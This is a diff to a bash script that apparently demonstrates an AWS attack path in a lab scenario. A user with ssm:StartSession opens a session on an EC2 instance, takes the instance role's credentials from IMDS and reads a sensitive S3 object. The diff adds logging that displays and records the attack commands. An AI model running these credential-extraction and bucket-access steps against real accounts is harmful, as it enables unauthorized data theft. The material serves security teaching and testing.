@@ -4,7 +4,9 @@
 # This scenario demonstrates how a user with ssm:StartSession can remotely access
 # EC2 instances with S3 access roles to extract credentials and access sensitive buckets
 
-set -e
+
+# Disable AWS CLI paging
+export AWS_PAGER=""
 
 # Colors for output
 RED='\033[0;31m'
@@ -12,6 +14,24 @@ GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 # Configuration
 STARTING_USER="pl-prod-ssm-001-to-bucket-starting-user"
@@ -86,6 +106,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
+show_cmd aws sts get-caller-identity --query 'Arn' --output text
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -97,6 +118,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
+show_cmd aws sts get-caller-identity --query 'Account' --output text
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -104,6 +126,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Verify we don't have bucket access yet
 echo -e "${YELLOW}Step 4: Verifying we don't have bucket access yet${NC}"
 echo "Attempting to access bucket: $TARGET_BUCKET"
+show_cmd aws s3 ls s3://$TARGET_BUCKET --region $AWS_REGION
 if aws s3 ls s3://$TARGET_BUCKET --region $AWS_REGION &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have bucket access already${NC}"
 else
@@ -114,6 +137,7 @@ echo ""
 # Step 5: Discover target EC2 instance (optional but helpful)
 echo -e "${YELLOW}Step 5: Discovering target EC2 instance${NC}"
 echo "Listing EC2 instances with their attached IAM roles..."
+show_cmd aws ec2 describe-instances --region $AWS_REGION --instance-ids $INSTANCE_ID --query 'Reservations[0].Instances[0].[InstanceId,State.Name,IamInstanceProfile.Arn]' --output text
 INSTANCE_INFO=$(aws ec2 describe-instances \
     --region $AWS_REGION \
     --instance-ids $INSTANCE_ID \
@@ -140,6 +164,7 @@ RETRY_COUNT=0
 SSM_READY=false
 
 while [ $RETRY_COUNT -lt $MAX_RETRIES ]; do
+    show_cmd aws ssm describe-instance-information --region $AWS_REGION --filters "Key=InstanceIds,Values=$INSTANCE_ID" --query 'InstanceInformationList[0].PingStatus' --output text
     SSM_STATUS=$(aws ssm describe-instance-information \
         --region $AWS_REGION \
         --filters "Key=InstanceIds,Values=$INSTANCE_ID" \
@@ -195,6 +220,7 @@ echo "Press ENTER to start the SSM session..."
 read
 
 # Start the interactive session
+show_attack_cmd aws ssm start-session --region $AWS_REGION --target $INSTANCE_ID
 aws ssm start-session \
     --region $AWS_REGION \
     --target $INSTANCE_ID
@@ -257,6 +283,7 @@ export AWS_SESSION_TOKEN="$EXTRACTED_SESSION_TOKEN"
 export AWS_REGION=$AWS_REGION
 
 # Verify new identity
+show_cmd aws sts get-caller-identity --query 'Arn' --output text
 NEW_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text 2>/dev/null || echo "")
 
 if [ -z "$NEW_IDENTITY" ]; then
@@ -273,6 +300,7 @@ echo -e "${YELLOW}Step 9: Verifying S3 bucket access${NC}"
 echo "Attempting to access bucket: $TARGET_BUCKET"
 
 echo -e "\nListing bucket contents..."
+show_attack_cmd aws s3 ls s3://$TARGET_BUCKET --region $AWS_REGION
 if aws s3 ls s3://$TARGET_BUCKET --region $AWS_REGION; then
     echo -e "${GREEN}✓ Successfully listed bucket contents!${NC}"
 else
@@ -281,6 +309,7 @@ else
 fi
 
 echo -e "\nReading sensitive data file..."
+show_attack_cmd aws s3 cp s3://$TARGET_BUCKET/sensitive-data.txt - --region $AWS_REGION
 if aws s3 cp s3://$TARGET_BUCKET/sensitive-data.txt - --region $AWS_REGION; then
     echo -e "\n${GREEN}✓ Successfully read sensitive data!${NC}"
     echo -e "${GREEN}✓ BUCKET ACCESS CONFIRMED${NC}"
@@ -304,6 +333,14 @@ echo "5. Achieved: S3 Bucket Access to $TARGET_BUCKET"
 echo -e "\n${YELLOW}Attack Path:${NC}"
 echo -e "  $STARTING_USER → (ssm:StartSession) → EC2 Instance"
 echo -e "  → (Extract Credentials via IMDS) → $EC2_BUCKET_ROLE → S3 Bucket"
+
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo ""
+    echo -e "${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+fi
 
 echo -e "\n${YELLOW}Attack Artifacts:${NC}"
 echo "- SSM session on instance: $INSTANCE_ID"
